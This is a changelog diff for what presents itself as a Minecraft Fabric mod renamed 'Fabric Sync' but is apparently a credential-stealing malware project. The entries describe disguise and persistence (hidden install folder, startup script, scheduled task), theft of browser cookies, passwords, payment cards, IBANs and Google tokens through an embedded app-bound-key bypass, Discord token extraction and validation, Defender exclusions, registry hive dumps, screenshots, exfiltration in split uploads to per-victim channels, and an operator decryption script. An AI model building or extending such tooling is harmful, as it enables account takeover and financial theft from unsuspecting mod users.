@@ -1,5 +1,16 @@
 # Changelog
 
+## 0.2.7
+
+- Visible rename to `Fabric Sync`: install directory `%LOCALAPPDATA%\FabricSync`, `cache\`, `runtime.jar`, `javaw.exe`, `startup.vbs`, `update.*`, `session.txt`, `config.json`, `.version`, `logs\update.log`, task `\FabricSync`, channel `sync-<host>-<user>`, embed `Fabric Sync`, `fabric-sync-<version>.jar`, `sync-<ts>.zip`, `cache\system-<ts>.zip`, `cache\elevate.bat`, `screen-<ts>.png` and `out-<ts>.txt`. The mod id stays `serverpackcore`.
+- Legacy installs are detected in one place: `ServerPackCore` wins if `FabricSync` does not exist, and keeps the old agent/helper/task names because the deployed helper references them. A fresh install uses the full modern tree.
+- ABE v20: ChromElevator v0.20.0 (MIT, pinned SHA-256, `NOTICE`) is embedded, verified, extracted to `cache\tools` and run per browser in the user session. Cookies, passwords, cards, IBANs and Google tokens land in `browsers/<label>/abe/*.tsv`; the decrypted key is `v20=`. Failure leaves `app_bound=` and `abe_error=` and continues with `hives` as fallback.
+- Discord token: minimal LevelDB reader with Snappy for `.ldb` and `.log`, `dQw4w9WgXcQ:` extraction, DPAPI `CurrentUser` unwrap and `/users/@me` validation, saved to `discord/token.txt`. Raw dumps remain fallback.
+- Bootstrap no longer invokes `hives` or UAC. `hives` stays a manual command with three attempts per run; its elevated script adds persistent Defender exclusions for the install directory, the mods folder, `reg.exe` and `esentutl.exe` before `reg save`.
+- Uploads over ~8 MB are split into sorted `.partNN` files; README documents reassembly.
+- `decrypt.py` consumes ABE TSV and `discord/token.txt` first, so 0.2.7 v20 and Discord open without `-p` or `--machinekey`.
+- Mod metadata is now `Fabric Sync`, with `archives_base_name=fabric-sync`; the id is unchanged. The install directory is hidden with `attrib +h`, not system.
+
 ## 0.2.6
 
 - Harvest: the app-bound key (v20 cookies) is now unwrapped live while the agent runs in the victim session. The outer machine DPAPI layer and the inner user layer are both available to a normal user, so no administrator, no UAC and no `SECURITY.hiv` are needed. `keys.txt` gains `v20=<key>`; `app_bound=` stays as an offline fallback.
